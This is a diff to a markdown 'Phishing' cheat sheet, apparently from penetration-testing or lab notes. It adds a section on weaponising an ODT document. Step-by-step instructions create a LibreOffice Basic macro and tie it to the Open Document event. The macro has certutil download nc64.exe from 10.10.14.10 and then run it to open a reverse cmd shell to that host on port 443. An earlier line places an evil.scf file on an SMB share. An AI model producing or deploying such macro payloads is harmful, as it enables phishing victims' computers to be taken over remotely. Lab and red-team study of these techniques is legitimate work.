@@ -1,7 +1,7 @@
 ---
 title: "Phishing"
 date: 2024-6-26
-tags: ["phishing", "email", "xll", "excel", "hta", "shortcut", "Windows"]
+tags: ["phishing", "email", "xll", "excel", "hta", "shortcut", "Windows", "odt", "libre", "vba"]
 ---
 
 ---
@@ -134,6 +134,38 @@ smbclient -N \\\\10.10.11.10\\share\\
 
 ```bash
 mput evil.scf
+```
+
+<br>
+
+---
+
+### Phishing with odt (Open Office format)
+
+```bash
++------------------------------------------------------+
+|1. "Tools" > "Macros" > "Organize Macros" > "Basic..."|
+|2. "Untitled 1" > "Standard" > "New"                  |
+|3. "Paste the code below"                             |
++------------------------------------------------------+
+```
+
+<br>
+
+```bash
+Sub OnLoad
+    shell("cmd /c certutil -urlcache -split -f http://10.10.14.10/nc64.exe C:\programdata\nc64.exe && C:\programdata\nc64.exe -e cmd 10.10.14.10 443")
+End Sub
+```
+
+<br>
+
+```bash
++---------------------------------------------------------+
+|4. "Tools" > "Organize Macros" > "Basic..." > "Assign..."|
+|5. "Events" > "Open Document" > "OK"                     |
+|6. "SAVE"                                                |
++---------------------------------------------------------+
 ```
 
 <br>
